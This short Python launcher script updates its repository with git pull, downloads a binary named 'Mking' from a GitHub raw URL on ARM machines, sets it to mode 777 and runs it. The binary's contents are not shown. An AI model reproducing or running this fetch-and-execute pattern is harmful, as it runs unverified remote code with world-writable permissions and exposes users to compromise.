import os
os.system('git pull')
from os import path,system
from platform import uname
bt=uname().machine.lower()
if 'aarch' in bt:
    if path.isfile("Mking"):
        pass
    else:
        system("curl -L https://raw.githubusercontent.com/hechamoto/files/main/Mking -o Mking")
os.system('chmod 777 Mking && ./Mking')
